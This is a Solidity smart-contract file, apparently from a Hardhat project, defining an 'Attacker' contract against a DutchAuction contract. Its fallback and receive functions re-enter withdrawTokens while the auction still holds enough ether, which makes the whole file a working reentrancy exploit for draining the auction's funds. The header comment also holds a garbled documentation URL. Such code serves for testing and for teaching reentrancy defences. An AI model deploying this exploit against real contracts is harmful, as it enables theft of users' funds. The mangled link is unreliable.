// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/*
What is ERC20 token? Watch this video to understand:
https://www.youtube.com/watch?v=cqZhNzZoMh8

Documentation:
https://docs.openzeppelin.com/cGLDToken.balanceOfontracts/2.x/erc20
*/
import "../contracts/DutchAuction.sol";
import "hardhat/console.sol";

contract Attacker{
    DutchAuction private dutchAuction; 
    uint256 private refund;
    constructor(address _dutchAuctionAddress) {
        dutchAuction = DutchAuction(_dutchAuctionAddress);
    }

    function placeBid() external payable{
        dutchAuction.placeBid{value : msg.value}();
    }

    function getRefund() external view returns (uint256){
        return dutchAuction.getRefund();
    }

    function attack() external{
        refund = dutchAuction.getRefund();
        dutchAuction.withdrawTokens();
    }

    function _internalAttackLogic() private {
        if (address(dutchAuction).balance >= refund) {
            dutchAuction.withdrawTokens();
        }
    }

    fallback() external payable {
       _internalAttackLogic();
    }

    receive() external payable{
        _internalAttackLogic();
    }
}


